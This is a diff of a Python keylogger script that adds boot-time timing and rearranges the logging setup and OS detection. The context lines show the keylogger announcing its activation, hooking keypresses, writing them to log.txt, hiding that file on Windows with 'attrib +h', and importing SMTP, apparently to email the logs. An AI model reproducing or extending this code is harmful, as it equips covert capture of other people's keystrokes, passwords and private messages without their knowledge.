@@ -83,6 +83,14 @@ def main():
         print("[INFO]\tKeylogger Activated Successfully...")
         info("Keylogger activated...")
 
+        t1 = time()
+
+        if t1-t0 >= 1:
+            print(f"[INFO]\tBooting Time: {t1-t0} s.")
+
+        else:
+            print(f"[INFO]\tBooting Time: {(t1-t0)*1000} ms.")
+
         def on_press(key):
             if key == Key.alt_gr:
                 print("[LOG]\talt_gr pressed.")
@@ -321,8 +329,6 @@ try:
     print("[INFO]\tImporting DEBUG, basicConfig, info from logging.")
     from logging import DEBUG, basicConfig, info
 
-    basicConfig(filename="log.txt", level=DEBUG, format="%(asctime)s: %(message)s")
-
     print("[INFO]\tImporting remove from os.")
     from os import remove
 
@@ -331,9 +337,6 @@ try:
 
     print("[INFO]\tImporting system as environment from platform.")
     from platform import system as environment
-
-    operating_system = environment()
-    print(f"[INFO]\tOperating System: {operating_system}")
 
     print(
         "[INFO]\tImporting SMTP, SMTPAuthenticationError, SMTPServerDisconnected from smtplib."
@@ -346,8 +349,18 @@ try:
     print("[INFO]\tImporting exit as terminate from sys.")
     from sys import exit as terminate
 
+    print("[INFO]\tImporting time from time.")
+    from time import time
+
     print("[INFO]\tImporting Beep from winsound.")
     from winsound import Beep
+
+    t0 = time()
+
+    basicConfig(filename="log.txt", level=DEBUG, format="%(asctime)s: %(message)s")
+
+    operating_system = environment()
+    print(f"[INFO]\tOperating System: {operating_system}")
 
     if operating_system == "Windows":
         terminal("attrib +h log.txt")
